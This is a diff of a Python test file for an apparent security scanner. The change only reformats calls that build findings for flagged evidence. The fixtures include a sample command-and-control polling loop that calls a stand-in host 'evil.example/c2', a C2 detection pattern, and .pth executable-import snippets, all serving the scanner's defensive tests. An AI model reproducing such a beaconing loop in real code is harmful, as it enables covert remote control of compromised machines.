@@ -450,14 +450,29 @@ def test_multiline_evidence_reopens_on_continuation_change():
     # already-flagged C2 loop (a continuation line) reopens the finding...
     old = "while True:\n    time.sleep(60)\n    requests.get('http://old.example/poll')\n"
     new = "while True:\n    time.sleep(60)\n    requests.get('http://evil.example/c2')\n"
-    fo = _mk(sp.CRITICAL, "p", "p/loop.py", "C2 polling/beaconing loop detected",
-             sp._extract_evidence(old, sp.RE_C2_POLLING))
-    fn = _mk(sp.CRITICAL, "p", "p/loop.py", "C2 polling/beaconing loop detected",
-             sp._extract_evidence(new, sp.RE_C2_POLLING))
+    fo = _mk(
+        sp.CRITICAL,
+        "p",
+        "p/loop.py",
+        "C2 polling/beaconing loop detected",
+        sp._extract_evidence(old, sp.RE_C2_POLLING),
+    )
+    fn = _mk(
+        sp.CRITICAL,
+        "p",
+        "p/loop.py",
+        "C2 polling/beaconing loop detected",
+        sp._extract_evidence(new, sp.RE_C2_POLLING),
+    )
     assert sp._finding_key(fo) != sp._finding_key(fn)
     # ...while a benign line shift of the same loop stays stable.
-    shifted = _mk(sp.CRITICAL, "p", "p/loop.py", "C2 polling/beaconing loop detected",
-                  sp._extract_evidence("\n\n" + old, sp.RE_C2_POLLING))
+    shifted = _mk(
+        sp.CRITICAL,
+        "p",
+        "p/loop.py",
+        "C2 polling/beaconing loop detected",
+        sp._extract_evidence("\n\n" + old, sp.RE_C2_POLLING),
+    )
     assert sp._finding_key(fo) == sp._finding_key(shifted)
 
 
@@ -481,10 +496,20 @@ def test_canon_evidence_keeps_duplicate_spans():
 def test_canon_evidence_does_not_strip_inner_marker_from_raw_code():
     # Raw .pth evidence has no leading L<NN>: marker; an L<NN>:-looking substring
     # inside the code must be kept, so changing the code before it reopens.
-    base = _mk(sp.HIGH, "p", "p/x.pth", ".pth has 1 executable import line(s)",
-               "import os; note='L7: same_suffix'")
-    changed = _mk(sp.HIGH, "p", "p/x.pth", ".pth has 1 executable import line(s)",
-                  "import urllib.request; note='L7: same_suffix'")
+    base = _mk(
+        sp.HIGH,
+        "p",
+        "p/x.pth",
+        ".pth has 1 executable import line(s)",
+        "import os; note='L7: same_suffix'",
+    )
+    changed = _mk(
+        sp.HIGH,
+        "p",
+        "p/x.pth",
+        ".pth has 1 executable import line(s)",
+        "import urllib.request; note='L7: same_suffix'",
+    )
     assert sp._finding_key(base) != sp._finding_key(changed)
 
 
